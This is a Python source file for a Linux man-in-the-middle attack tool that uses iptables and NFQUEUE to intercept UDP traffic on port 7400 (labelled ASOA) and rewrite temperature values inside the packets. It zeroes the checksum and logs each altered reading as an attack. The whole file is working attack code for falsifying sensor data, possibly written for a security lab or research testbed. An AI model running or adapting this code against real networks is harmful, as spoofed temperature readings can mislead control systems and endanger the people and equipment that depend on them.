#!/usr/bin/env python3
"""
Linux MITM Implementation
Uses NFQUEUE with iptables to intercept and modify UDP packets inline
"""

import socket
import struct
import threading
import time
import subprocess
from utils.logger import setup_logger
from packet_handler import PacketHandler

class LinuxMITM:
    def __init__(self, target_ip, attack_type, target_temp=None, bias=None):
        self.target_ip = target_ip
        self.attack_type = attack_type
        self.target_temp = target_temp
        self.bias = bias
        self.logger = setup_logger('linux_mitm', level='INFO')
        
        self.target_port = 7400  # ASOA UDP port
        self.queue_num = 1
        self.running = False
        self.nfqueue = None
        self.packet_handler = PacketHandler(attack_type, target_temp, bias)
        
        # iptables rules
        self.iptables_rules_added = False
        
    def start(self):
        """Start the Linux MITM attack"""
        self.logger.info("🐧 Starting Linux MITM attack...")
        
        try:
            # Setup iptables rules
            self._setup_iptables()
            
            # Start NFQUEUE
            self._start_nfqueue()
            
            self.running = True
            self.logger.info("✅ Linux MITM attack started successfully")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start Linux MITM: {e}")
            self.stop()
            raise
            
    def stop(self):
        """Stop the Linux MITM attack"""
        self.logger.info("🛑 Stopping Linux MITM attack...")
        
        self.running = False
        
        # Stop NFQUEUE
        if self.nfqueue:
            try:
                self.nfqueue.unbind()
            except:
                pass
            self.nfqueue = None
            
        # Clean up iptables rules
        self._cleanup_iptables()
        
        self.logger.info("✅ Linux MITM attack stopped")
        
    def _setup_iptables(self):
        """Setup iptables rules to redirect traffic to NFQUEUE"""
        self.logger.info("🔧 Setting up iptables rules...")
        
        try:
            # Add rule to redirect UDP port 7400 traffic to NFQUEUE
            cmd = [
                "iptables", "-A", "INPUT",
                "-p", "udp", "--dport", str(self.target_port),
                "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                raise Exception(f"Failed to add iptables rule: {result.stderr}")
                
            # Add rule for OUTPUT chain as well
            cmd = [
                "iptables", "-A", "OUTPUT",
                "-p", "udp", "--dport", str(self.target_port),
                "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                raise Exception(f"Failed to add OUTPUT iptables rule: {result.stderr}")
                
            self.iptables_rules_added = True
            self.logger.info("✅ iptables rules added successfully")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to setup iptables: {e}")
            self._cleanup_iptables()
            raise
            
    def _cleanup_iptables(self):
        """Remove iptables rules"""
        if not self.iptables_rules_added:
            return
            
        try:
            # Remove INPUT rule
            cmd = [
                "iptables", "-D", "INPUT",
                "-p", "udp", "--dport", str(self.target_port),
                "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
            ]
            
            subprocess.run(cmd, capture_output=True)
            
            # Remove OUTPUT rule
            cmd = [
                "iptables", "-D", "OUTPUT",
                "-p", "udp", "--dport", str(self.target_port),
                "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
            ]
            
            subprocess.run(cmd, capture_output=True)
            
            self.iptables_rules_added = False
            self.logger.info("✅ iptables rules removed")
            
        except Exception as e:
            self.logger.error(f"❌ Failed to cleanup iptables: {e}")
            
    def _start_nfqueue(self):
        """Start the NFQUEUE to intercept packets"""
        self.logger.info(f"🔄 Starting NFQUEUE on queue {self.queue_num}...")
        
        try:
            # Import netfilterqueue here to handle import errors gracefully
            try:
                from netfilterqueue import NetfilterQueue
            except ImportError:
                raise Exception("netfilterqueue not installed. Run: pip install netfilterqueue")
                
            self.nfqueue = NetfilterQueue()
            self.nfqueue.bind(self.queue_num, self._process_packet)
            
            self.logger.info(f"🔄 NFQUEUE bound to queue {self.queue_num}")
            
            # Start NFQUEUE in a separate thread
            self.nfqueue_thread = threading.Thread(target=self._nfqueue_worker)
            self.nfqueue_thread.daemon = True
            self.nfqueue_thread.start()
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start NFQUEUE: {e}")
            raise
            
    def _nfqueue_worker(self):
        """NFQUEUE worker thread"""
        try:
            self.logger.info("🔄 NFQUEUE worker started")
            self.nfqueue.run()
        except Exception as e:
            if self.running:
                self.logger.error(f"❌ NFQUEUE worker error: {e}")
        finally:
            self.logger.info("🔄 NFQUEUE worker stopped")
            
    def _process_packet(self, pkt):
        """Process intercepted packet"""
        try:
            # Get packet data
            payload = pkt.get_payload()
            
            if not payload:
                pkt.accept()
                return
                
            # Parse IP and UDP headers
            ip_header = payload[:20]
            udp_header = payload[20:28]
            
            # Check if this is UDP packet to our target port
            if len(udp_header) >= 8:
                dest_port = struct.unpack('!H', udp_header[2:4])[0]
                
                if dest_port == self.target_port:
                    # Extract UDP payload (temperature data)
                    udp_payload = payload[28:]
                    
                    if len(udp_payload) >= 4:
                        # Extract original temperature
                        original_temp = struct.unpack('<f', udp_payload[:4])[0]
                        
                        # Modify temperature
                        modified_temp = self.packet_handler.modify_temperature(original_temp)
                        
                        # Create modified payload
                        modified_payload = struct.pack('<f', modified_temp) + udp_payload[4:]
                        
                        # Update packet payload
                        new_payload = payload[:28] + modified_payload
                        pkt.set_payload(new_payload)
                        
                        # Recalculate UDP checksum
                        self._recalculate_udp_checksum(pkt)
                        
                        # Log the attack
                        self._log_attack(original_temp, modified_temp)
                        
                        self.logger.debug(f"🌡️ Modified temperature: {original_temp:.1f}°C → {modified_temp:.1f}°C")
                        
            # Accept the packet (modified or not)
            pkt.accept()
            
        except Exception as e:
            self.logger.error(f"❌ Packet processing error: {e}")
            pkt.accept()  # Accept packet on error
            
    def _recalculate_udp_checksum(self, pkt):
        """Recalculate UDP checksum after modification"""
        try:
            # This is a simplified checksum recalculation
            # In a real implementation, you'd need to properly recalculate the checksum
            # For now, we'll set it to 0 (no checksum)
            payload = pkt.get_payload()
            
            if len(payload) >= 28:
                # Set UDP checksum to 0 (no checksum)
                new_payload = payload[:26] + b'\x00\x00' + payload[28:]
                pkt.set_payload(new_payload)
                
        except Exception as e:
            self.logger.debug(f"Checksum recalculation error: {e}")
            
    def _log_attack(self, original_temp, modified_temp):
        """Log the attack details"""
        try:
            self.logger.info(f"🎯 ATTACK: {original_temp:.1f}°C → {modified_temp:.1f}°C")
            
            # Update packet counter
            if hasattr(self.packet_handler, 'packets_processed'):
                self.packet_handler.packets_processed += 1
                
        except Exception as e:
            self.logger.debug(f"Logging error: {e}")
            
    def get_stats(self):
        """Get attack statistics"""
        return {
            'platform': 'linux',
            'target_ip': self.target_ip,
            'target_port': self.target_port,
            'queue_num': self.queue_num,
            'attack_type': self.attack_type,
            'running': self.running,
            'packets_processed': getattr(self.packet_handler, 'packets_processed', 0)
        }
